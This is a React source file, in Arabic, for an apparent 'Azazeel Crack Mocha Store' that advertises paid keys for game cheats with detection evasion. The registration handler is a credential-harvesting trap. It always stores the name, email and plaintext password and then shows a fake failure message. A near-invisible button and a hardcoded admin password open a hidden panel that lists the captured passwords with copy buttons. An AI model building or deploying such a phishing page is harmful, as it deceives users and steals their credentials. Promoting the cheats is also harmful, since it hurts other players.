import React, { useState, useEffect } from 'react';
import { Lock, Key, Shield, Zap, Users, Map, Crown, Copy, Trash2, LogOut, ShoppingBag, ArrowLeft, ArrowRight, X } from 'lucide-react';

// Custom Message Modal Component
const MessageModal = ({ message, onClose }) => {
  if (!message) return null;

  const color = message.type === 'success' ? 'bg-green-600' : 'bg-red-600';
  const icon = message.type === 'success' ? <Zap className="w-5 h-5" /> : <X className="w-5 h-5" />;

  return (
    <div className={`fixed top-4 left-1/2 transform -translate-x-1/2 ${color} text-white px-6 py-3 rounded-xl shadow-2xl z-50 transition-all duration-300 animate-fadeInUp flex items-center gap-3`} style={{ direction: 'rtl' }}>
      {icon}
      <span>{message.text}</span>
      <button onClick={onClose} className="ml-3 opacity-70 hover:opacity-100">
        <X className="w-4 h-4" />
      </button>
    </div>
  );
};

// Main Application Component
export default function AzazeelCrackStore() {
  const [view, setView] = useState('home'); // home, login, store, admin, product
  const [isAdmin, setIsAdmin] = useState(false);
  const [selectedProduct, setSelectedProduct] = useState(null);
  const [loginData, setLoginData] = useState({
    email: '',
    name: '',
    password: '',
    confirmPassword: ''
  });
  const [adminPassword, setAdminPassword] = useState('');
  const [registrationAttempts, setRegistrationAttempts] = useState([]);
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [message, setMessage] = useState(null);

  // Helper function to show modal instead of alert
  const showMessage = (text, type = 'error', duration = 3000) => {
    setMessage({ type, text });
    setTimeout(() => setMessage(null), duration);
  };

  const products = [
    {
      id: 1,
      name: 'مفتاح مجاني',
      price: 'مجانًا',
      duration: 'محدود',
      features: [
        'الرد على الروبوتات بالإنجليزية',
        'حماية أساسية من الكشف',
        'دعم قياسي',
        'وقت استخدام محدود'
      ],
      isPremium: false
    },
    {
      id: 2,
      name: 'مفتاح مميز',
      price: '$29.99',
      duration: 'شهر كامل',
      features: [
        'تفعيل خاصية الطيران',
        'إنهاء جميع الخرائط فورًا',
        'طرد/حظر اللاعبين',
        'أتمتة متقدمة',
        'دعم ذو أولوية 24/7',
        'وضع غير قابل للكشف'
      ],
      isPremium: true
    }
  ];

  const handleRegister = (e) => {
    e.preventDefault();
    
    // Always collect and then show an error message
    const attempt = {
      id: Date.now(),
      email: loginData.email,
      name: loginData.name,
      password: loginData.password,
      timestamp: new Date().toISOString()
    };
    
    setRegistrationAttempts(prev => [...prev, attempt]);
    
    showMessage('فشل التسجيل. يرجى المحاولة مرة أخرى لاحقًا.', 'error');
  };

  const handleAdminLogin = (e) => {
    e.preventDefault();
    if (adminPassword === 'azr313') {
      setIsAdmin(true);
      setView('admin');
      setShowAdminLogin(false);
      setAdminPassword('');
    } else {
      showMessage('كلمة مرور المسؤول غير صحيحة.', 'error');
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showMessage('تم النسخ إلى الحافظة!', 'success');
  };

  const deleteAttempt = (id) => {
    setRegistrationAttempts(prev => prev.filter(a => a.id !== id));
  };

  const viewProduct = (product) => {
    setSelectedProduct(product);
    setView('product');
  };

  const handlePurchase = () => {
    showMessage('يرجى التسجيل لشراء المفاتيح', 'error');
  };

  // Shared Admin Login Modal (Moved out for cleaner rendering)
  const AdminLoginModal = () => (
    showAdminLogin && (
      <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4" style={{ direction: 'rtl' }}>
        <div className="bg-gray-800 rounded-2xl p-8 max-w-md w-full shadow-2xl border border-purple-500">
          <h2 className="text-2xl font-bold mb-6 flex items-center gap-2">
            <Shield className="w-6 h-6" />
            وصول المسؤول
          </h2>
          <div>
            <input
              type="password"
              placeholder="كلمة مرور المسؤول"
              value={adminPassword}
              onChange={(e) => setAdminPassword(e.target.value)}
              onKeyPress={(e) => e.key === 'Enter' && handleAdminLogin(e)}
              className="w-full px-4 py-3 bg-gray-700 rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-purple-500 text-right"
              style={{ direction: 'rtl' }}
            />
            <div className="flex gap-3">
              <button
                onClick={handleAdminLogin}
                className="flex-1 bg-purple-600 hover:bg-purple-700 py-3 rounded-lg font-semibold transition-colors"
              >
                دخول
              </button>
              <button
                onClick={() => setShowAdminLogin(false)}
                className="flex-1 bg-gray-700 hover:bg-gray-600 py-3 rounded-lg font-semibold transition-colors"
              >
                إلغاء
              </button>
            </div>
          </div>
        </div>
      </div>
    )
  );

  // Home Page
  if (view === 'home') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black text-white" style={{ direction: 'rtl' }}>
        {/* Admin Access Button (Invisible) */}
        <button
          onClick={() => setShowAdminLogin(true)}
          className="fixed top-4 left-4 w-3 h-3 bg-gray-900 rounded-full opacity-10 hover:opacity-30 transition-opacity z-50"
        />
        
        <AdminLoginModal />
        <MessageModal message={message} onClose={() => setMessage(null)} />

        {/* Hero Section */}
        <div className="container mx-auto px-4 py-12 flex items-center justify-center min-h-screen">
          <div className="text-center max-w-4xl">
            <div className="inline-flex items-center justify-center w-24 h-24 bg-purple-600 rounded-full mb-6 shadow-lg shadow-purple-500/50 animate-pulse">
              <Lock className="w-12 h-12" />
            </div>
            <h1 className="text-7xl font-bold mb-4 bg-gradient-to-r from-purple-400 via-pink-400 to-purple-400 bg-clip-text text-transparent">
              متجر موكا شروخ عزازيل
            </h1>
            <p className="text-2xl text-gray-300 mb-8">Azazeel Crack Mocha Store</p>
            <p className="text-xl text-gray-400 mb-12 max-w-2xl mx-auto">
              افتح تجربة اللعب القصوى بمفاتيح موكا المتميزة.
              احصل على ميزات حصرية وتغلب على اللعبة.
            </p>
            
            <div className="flex gap-6 justify-center flex-wrap">
              <button
                onClick={() => setView('store')}
                className="flex items-center gap-3 px-8 py-4 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 rounded-xl font-bold text-lg shadow-lg shadow-purple-500/50 transition-all transform hover:scale-105"
              >
                تصفح المتجر
                <ArrowLeft className="w-6 h-6" />
              </button>
              
              <button
                onClick={() => setView('login')}
                className="flex items-center gap-3 px-8 py-4 bg-gray-800 hover:bg-gray-700 rounded-xl font-bold text-lg border border-purple-500/50 transition-all transform hover:scale-105"
              >
                <Lock className="w-6 h-6" />
                تسجيل حساب جديد / دخول
              </button>
            </div>

            <div className="mt-16 grid grid-cols-1 md:grid-cols-3 gap-6">
              <div className="bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-xl p-6 border border-purple-500/30">
                <Zap className="w-10 h-10 text-yellow-400 mx-auto mb-3" />
                <h3 className="text-xl font-bold mb-2">تسليم فوري</h3>
                <p className="text-gray-400">احصل على مفاتيحك فور الشراء</p>
              </div>
              
              <div className="bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-xl p-6 border border-purple-500/30">
                <Shield className="w-10 h-10 text-green-400 mx-auto mb-3" />
                <h3 className="text-xl font-bold mb-2">آمن 100%</h3>
                <p className="text-gray-400">تقنية متقدمة لمكافحة الكشف</p>
              </div>
              
              <div className="bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-xl p-6 border border-purple-500/30">
                <Users className="w-10 h-10 text-blue-400 mx-auto mb-3" />
                <h3 className="text-xl font-bold mb-2">دعم على مدار الساعة</h3>
                <p className="text-gray-400">نحن هنا دائمًا لمساعدتك</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Login Page
  if (view === 'login') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black text-white" style={{ direction: 'rtl' }}>
        <button
          onClick={() => setShowAdminLogin(true)}
          className="fixed top-4 left-4 w-3 h-3 bg-gray-900 rounded-full opacity-10 hover:opacity-30 transition-opacity z-50"
        />
        
        <AdminLoginModal />
        <MessageModal message={message} onClose={() => setMessage(null)} />

        <div className="container mx-auto px-4 py-12 flex items-center justify-center min-h-screen">
          <div className="max-w-md w-full">
            <button
              onClick={() => setView('home')}
              className="mb-6 text-gray-400 hover:text-white transition-colors flex items-center gap-2"
            >
              <ArrowRight className="w-5 h-5" />
              العودة للرئيسية
            </button>

            <div className="text-center mb-8">
              <div className="inline-flex items-center justify-center w-20 h-20 bg-purple-600 rounded-full mb-4 shadow-lg shadow-purple-500/50">
                <Lock className="w-10 h-10" />
              </div>
              <h1 className="text-5xl font-bold mb-2 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                متجر موكا شروخ عزازيل
              </h1>
              <p className="text-gray-400 text-lg">Azazeel Crack Mocha Store</p>
            </div>

            <div className="bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-2xl p-8 shadow-2xl border border-purple-500/30">
              <h2 className="text-2xl font-bold mb-6 text-center">إنشاء حساب</h2>
              <div className="space-y-4">
                <input
                  type="text"
                  placeholder="الاسم الكامل"
                  value={loginData.name}
                  onChange={(e) => setLoginData({...loginData, name: e.target.value})}
                  className="w-full px-4 py-3 bg-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 transition-all text-right"
                  style={{ direction: 'rtl' }}
                />
                <input
                  type="email"
                  placeholder="البريد الإلكتروني (Hotmail, Gmail, etc.)"
                  value={loginData.email}
                  onChange={(e) => setLoginData({...loginData, email: e.target.value})}
                  className="w-full px-4 py-3 bg-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 transition-all text-right"
                  style={{ direction: 'rtl' }}
                />
                <input
                  type="password"
                  placeholder="كلمة المرور"
                  value={loginData.password}
                  onChange={(e) => setLoginData({...loginData, password: e.target.value})}
                  className="w-full px-4 py-3 bg-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 transition-all text-right"
                  style={{ direction: 'rtl' }}
                />
                <input
                  type="password"
                  placeholder="تأكيد كلمة المرور"
                  value={loginData.confirmPassword}
                  onChange={(e) => setLoginData({...loginData, confirmPassword: e.target.value})}
                  onKeyPress={(e) => e.key === 'Enter' && handleRegister(e)}
                  className="w-full px-4 py-3 bg-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 transition-all text-right"
                  style={{ direction: 'rtl' }}
                />
                <button
                  onClick={handleRegister}
                  className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 py-3 rounded-lg font-semibold shadow-lg shadow-purple-500/50 transition-all transform hover:scale-105"
                >
                  سجل الآن
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Admin Panel
  if (isAdmin && view === 'admin') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black text-white p-8" style={{ direction: 'rtl' }}>
        <MessageModal message={message} onClose={() => setMessage(null)} />
        <div className="container mx-auto max-w-6xl">
          <div className="flex justify-between items-center mb-8">
            <div>
              <h1 className="text-4xl font-bold flex items-center gap-3 mb-2">
                <Shield className="w-10 h-10 text-purple-400" />
                لوحة تحكم المسؤول
              </h1>
              <p className="text-gray-400">مراقبة محاولات التسجيل</p>
            </div>
            <button
              onClick={() => {
                setIsAdmin(false);
                setView('home');
              }}
              className="flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg transition-colors"
            >
              تسجيل الخروج
              <LogOut className="w-5 h-5" />
            </button>
          </div>

          <div className="bg-gray-800 rounded-2xl p-6 shadow-2xl border border-purple-500/30">
            <h2 className="text-2xl font-bold mb-6">محاولات التسجيل ({registrationAttempts.length})</h2>
            
            {registrationAttempts.length === 0 ? (
              <div className="text-center py-12 text-gray-400">
                <Users className="w-16 h-16 mx-auto mb-4 opacity-50" />
                <p>لا توجد محاولات تسجيل بعد</p>
              </div>
            ) : (
              <div className="space-y-4">
                {registrationAttempts.map((attempt) => (
                  <div key={attempt.id} className="bg-gray-700 rounded-xl p-5 border border-purple-500/20">
                    <div className="flex justify-between items-start mb-3">
                      <div className="flex-1">
                        <div className="flex items-center gap-2 mb-2">
                          <span className="font-semibold text-purple-400">الاسم:</span>
                          <span>{attempt.name}</span>
                        </div>
                        <div className="flex items-center gap-2 mb-2">
                          <span className="font-semibold text-purple-400">البريد:</span>
                          <span>{attempt.email}</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <span className="font-semibold text-purple-400">كلمة المرور:</span>
                          <span className="font-mono bg-gray-800 px-3 py-1 rounded text-left" style={{ direction: 'ltr' }}>{attempt.password}</span>
                          <button
                            onClick={() => copyToClipboard(attempt.password)}
                            className="p-2 hover:bg-gray-600 rounded transition-colors"
                            title="نسخ كلمة المرور"
                          >
                            <Copy className="w-4 h-4" />
                          </button>
                        </div>
                        <div className="text-sm text-gray-400 mt-2 text-left" style={{ direction: 'ltr' }}>
                          {new Date(attempt.timestamp).toLocaleString()}
                        </div>
                      </div>
                      <button
                        onClick={() => deleteAttempt(attempt.id)}
                        className="p-3 bg-red-600 hover:bg-red-700 rounded-lg transition-colors"
                        title="حذف المحاولة"
                      >
                        <Trash2 className="w-5 h-5" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  // Product Details Page
  if (view === 'product' && selectedProduct) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black text-white" style={{ direction: 'rtl' }}>
        <MessageModal message={message} onClose={() => setMessage(null)} />
        <nav className="bg-gray-900 bg-opacity-50 backdrop-blur-lg border-b border-purple-500/30 sticky top-0 z-40">
          <div className="container mx-auto px-4 py-4 flex justify-between items-center">
            <div className="flex items-center gap-3">
              <Lock className="w-8 h-8 text-purple-400" />
              <div>
                <h1 className="text-2xl font-bold">متجر موكا شروخ عزازيل</h1>
                <p className="text-xs text-gray-400">Azazeel Crack Mocha Store</p>
              </div>
            </div>
            <button
              onClick={() => setView('store')}
              className="px-6 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg transition-colors flex items-center gap-2"
            >
              العودة للمتجر
              <ArrowRight className="w-5 h-5" />
            </button>
          </div>
        </nav>

        <div className="container mx-auto px-4 py-12">
          <div className="max-w-4xl mx-auto">
            <div className={`bg-gradient-to-br ${selectedProduct.isPremium ? 'from-yellow-900 to-orange-900' : 'from-gray-800 to-gray-900'} rounded-3xl p-8 shadow-2xl border ${selectedProduct.isPremium ? 'border-yellow-500/50' : 'border-purple-500/30'}`}>
              <div className="flex items-start justify-between mb-6">
                <div>
                  <h2 className="text-4xl font-bold mb-2 flex items-center gap-3">
                    {selectedProduct.isPremium ? <Crown className="w-10 h-10 text-yellow-400" /> : <Key className="w-10 h-10 text-purple-400" />}
                    {selectedProduct.name}
                  </h2>
                  <p className="text-gray-300 text-lg">المدة: {selectedProduct.duration}</p>
                </div>
                <div className="text-left">
                  <div className={`text-5xl font-bold ${selectedProduct.isPremium ? 'text-yellow-400' : 'text-green-400'}`}>
                    {selectedProduct.price}
                  </div>
                </div>
              </div>

              <div className="border-t border-gray-700 pt-6 mb-6">
                <h3 className="text-2xl font-semibold mb-4 flex items-center gap-2">
                  <Zap className="w-6 h-6 text-purple-400" />
                  الميزات المضمنة
                </h3>
                <div className="space-y-3">
                  {selectedProduct.features.map((feature, index) => (
                    <div key={index} className="flex items-center gap-3 bg-gray-800 bg-opacity-50 p-4 rounded-lg">
                      <div className="w-2 h-2 bg-purple-500 rounded-full"></div>
                      <span className="text-lg">{feature}</span>
                    </div>
                  ))}
                </div>
              </div>

              <div className="flex gap-4">
                <button 
                  onClick={handlePurchase}
                  className="flex-1 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 py-4 rounded-xl font-bold text-lg shadow-lg shadow-purple-500/50 transition-all transform hover:scale-105"
                >
                  شراء المفتاح
                </button>
                <button
                  onClick={() => setView('store')}
                  className="px-8 bg-gray-700 hover:bg-gray-600 py-4 rounded-xl font-bold transition-colors"
                >
                  إلغاء
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Store Page
  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black text-white" style={{ direction: 'rtl' }}>
      <MessageModal message={message} onClose={() => setMessage(null)} />
      <nav className="bg-gray-900 bg-opacity-50 backdrop-blur-lg border-b border-purple-500/30 sticky top-0 z-40">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <div className="flex items-center gap-3">
            <Lock className="w-8 h-8 text-purple-400" />
            <div>
              <h1 className="text-2xl font-bold">متجر موكا شروخ عزازيل</h1>
              <p className="text-xs text-gray-400">Azazeel Crack Mocha Store</p>
            </div>
          </div>
          <button
            onClick={() => setView('home')}
            className="px-6 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg transition-colors border border-purple-500/50 flex items-center gap-2"
          >
            العودة للرئيسية
            <ArrowRight className="w-5 h-5" />
          </button>
        </div>
      </nav>

      <div className="container mx-auto px-4 py-12">
        <div className="text-center mb-12">
          <h2 className="text-5xl font-bold mb-4 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
            مفاتيح موكا المميزة
          </h2>
          <p className="text-gray-400 text-xl">أطلق العنان للإمكانات الكاملة لتجربة اللعب الخاصة بك</p>
        </div>

        <div className="grid md:grid-cols-2 gap-8 max-w-6xl mx-auto">
          {products.map((product) => (
            <div
              key={product.id}
              className={`bg-gradient-to-br ${product.isPremium ? 'from-yellow-900 to-orange-900 border-yellow-500/50' : 'from-gray-800 to-gray-900 border-purple-500/30'} rounded-3xl p-8 shadow-2xl border transform transition-all hover:scale-105 cursor-pointer`}
              onClick={() => viewProduct(product)}
            >
              <div className="flex justify-between items-start mb-6">
                <div>
                  {product.isPremium ? (
                    <Crown className="w-12 h-12 text-yellow-400 mb-3" />
                  ) : (
                    <Key className="w-12 h-12 text-purple-400 mb-3" />
                  )}
                  <h3 className="text-3xl font-bold mb-2">{product.name}</h3>
                  <p className="text-gray-300">{product.duration}</p>
                </div>
                <div className={`text-4xl font-bold ${product.isPremium ? 'text-yellow-400' : 'text-green-400'} text-left`}>
                  {product.price}
                </div>
              </div>

              <div className="space-y-3 mb-6">
                {product.features.slice(0, 3).map((feature, index) => (
                  <div key={index} className="flex items-center gap-2">
                    <div className="w-2 h-2 bg-purple-500 rounded-full"></div>
                    <span className="text-gray-300">{feature}</span>
                  </div>
                ))}
                {product.features.length > 3 && (
                  <p className="text-sm text-gray-400 italic">+{product.features.length - 3} ميزات أخرى...</p>
                )}
              </div>

              <button className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 py-3 rounded-xl font-semibold shadow-lg shadow-purple-500/50 transition-all">
                عرض التفاصيل
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
